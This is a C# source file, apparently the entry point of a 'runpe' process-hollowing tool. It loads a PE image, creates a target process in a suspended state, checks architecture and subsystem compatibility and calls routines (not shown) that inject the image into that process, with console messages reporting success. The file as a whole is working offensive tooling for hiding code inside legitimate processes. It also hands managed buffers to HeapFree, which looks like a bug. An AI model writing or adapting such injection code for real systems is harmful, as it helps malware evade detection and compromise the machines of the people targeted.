using System.Runtime.InteropServices;
using System.Text;
using TerraFX.Interop.Windows;
using static TerraFX.Interop.Windows.Windows;
using static ProcHollow.ProcessHollowing;

namespace ProcHollow
{
    internal partial class Program
    {
        [LibraryImport("kernel32.dll", EntryPoint = "RtlZeroMemory", SetLastError = false)]
        private static unsafe partial void ZeroMemory(void* address, IntPtr count);

        private static string lpSourceImage = string.Empty;
        private static string lpTargetProcess = string.Empty;

        static unsafe void Main(string[] args)
        {
            if (args.Length == 2)
            {
                lpSourceImage = args[0];
                lpTargetProcess = args[1];
            }
            else
            {
                Console.WriteLine("[HELP] runpe.exe <pe_file> <target_process>");
                return;
            }

            Console.WriteLine("[PROCESS HOLLOWING]");

            var FileContent = File.ReadAllBytes(lpSourceImage);
            if (FileContent == null)
                return;

            fixed (void* hFileContent = FileContent)
            {
                Console.WriteLine($"[+] PE file content : 0x{(ulong)hFileContent:X}");

                bool bPE = IsValidPE(hFileContent);
                if (!bPE)
                {
                    Console.WriteLine("[-] The PE file is not valid !");
                    
                    if (hFileContent != null)
                        HeapFree(GetProcessHeap(), 0, hFileContent);
                    
                    return;
                }

                Console.WriteLine("[+] The PE file is valid.");

                STARTUPINFOA SI;
                PROCESS_INFORMATION PI;

                ZeroMemory(&SI, sizeof(STARTUPINFOA));
                SI.cb = (uint)sizeof(STARTUPINFOA);
                ZeroMemory(&PI, sizeof(PROCESS_INFORMATION));

                // + 1 for null terminated string
                var asciiProcessName = new byte[lpTargetProcess.Length + 1];

                Encoding.ASCII.GetBytes(lpTargetProcess, asciiProcessName);

                fixed (byte* processName = asciiProcessName)
                {
                    bool bProcessCreation = CreateProcessA((sbyte*)processName, null, null, null, true, CREATE.CREATE_SUSPENDED, null, null, &SI, &PI);
                    if (!bProcessCreation)
                    {
                        Console.WriteLine("[-] An error is occured when trying to create the target process !");
                        CleanAndExitProcess(&PI, hFileContent);
                        
                        return;
                    }
                }

                BOOL bTarget32;
                IsWow64Process(PI.hProcess, &bTarget32);

                ProcessAddressInformation ProcessAddressInformation = new();
                if (bTarget32)
                {
                    Console.WriteLine("[-] This only supports 64 bit programs!");
                    CleanAndExitProcess(&PI, hFileContent);
                    return;
                }
                else
                {
                    ProcessAddressInformation = GetProcessAddressInformation(&PI);
                    if (ProcessAddressInformation.lpProcessImageBaseAddress == null || ProcessAddressInformation.lpProcessPEBAddress == null)
                    {
                        Console.WriteLine("[-] An error is occured when trying to get the image base address of the target process !");
                        CleanAndExitProcess(&PI, hFileContent);
                        return;
                    }
                }

                Console.WriteLine($"[+] Target Process PEB : 0x{(ulong)ProcessAddressInformation.lpProcessPEBAddress:X}");
                Console.WriteLine($"[+] Target Process Image Base : 0x{(ulong)ProcessAddressInformation.lpProcessImageBaseAddress:X}");

                bool bSource32 = IsPE32(hFileContent);
                if (bSource32)
                    Console.WriteLine("[+] Source PE Image architecture : x86");
                else
                    Console.WriteLine("[+] Source PE Image architecture : x64");

                if (bTarget32)
                    Console.WriteLine("[+] Target PE Image architecture : x86");
                else
                    Console.WriteLine("[+] Target PE Image architecture : x64");

                if (bSource32 && bTarget32 || !bSource32 && !bTarget32)
                    Console.WriteLine("[+] Architecture are compatible !");
                else
                {
                    Console.WriteLine("[-] Architecture are not compatible !");
                    return;
                }

                uint dwSourceSubsystem;
                if (bSource32)
                {
                    Console.WriteLine("[-] This only supports 64 bit programs!");
                    CleanAndExitProcess(&PI, hFileContent);
                    return;
                }
                else
                    dwSourceSubsystem = GetSubsystem(hFileContent);

                unchecked
                {
                    if (dwSourceSubsystem == (uint)-1)
                    {
                        Console.WriteLine("[-] An error is occured when trying to get the subsytem of the source image.");
                        CleanAndExitProcess(&PI, hFileContent);
                        return;
                    }
                }

                Console.WriteLine($"[+] Source Image subsystem : 0x{dwSourceSubsystem:X}");

                uint dwTargetSubsystem;
                if (bTarget32)
                {
                    Console.WriteLine("[-] An error is occured when trying to get the subsytem of the target process.");
                    CleanAndExitProcess(&PI, hFileContent);
                    return;
                }
                else
                    dwTargetSubsystem = GetSubsystemEx(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);

                unchecked
                {
                    if (dwTargetSubsystem == (uint)-1)
                    {
                        Console.WriteLine("[-] An error is occured when trying to get the subsytem of the target process.");
                        CleanAndExitProcess(&PI, hFileContent);
                        return;
                    }
                }

                Console.WriteLine($"[+] Target Process subsystem : 0x{dwTargetSubsystem}");

                if (dwSourceSubsystem == dwTargetSubsystem)
                    Console.WriteLine("[+] Subsytems are compatible.");
                else
                {
                    Console.WriteLine("[-] Subsytems are not compatible.");
                    CleanAndExitProcess(&PI, hFileContent);
                    return;
                }

                bool bHasReloc = HasRelocations(hFileContent);

                if (!bHasReloc)
                    Console.WriteLine("[+] The source image doesn't have a relocation table.");
                else
                    Console.WriteLine("[+] The source image has a relocation table.");

                if (bHasReloc)
                {
                    if (RunPERelocate(&PI, hFileContent))
                    {
                        Console.WriteLine("[+] The injection has succeed !");
                        CleanProcess(&PI, hFileContent);
                        return;
                    }
                }
                else
                {
                    if (RunPE(&PI, hFileContent))
                    {
                        Console.WriteLine("[+] The injection has succeed !");
                        CleanProcess(&PI, hFileContent);
                        return;
                    }
                }

                Console.WriteLine("[-] The injection has failed !");

                if (hFileContent != null)
                    HeapFree(GetProcessHeap(), 0, hFileContent);

                if (PI.hThread != NULL)
                    CloseHandle(PI.hThread);

                if (PI.hProcess != NULL)
                {
                    unchecked { TerminateProcess(PI.hProcess, (uint)-1); }
                    CloseHandle(PI.hProcess);
                }
            }

            return;
        }
    }
}
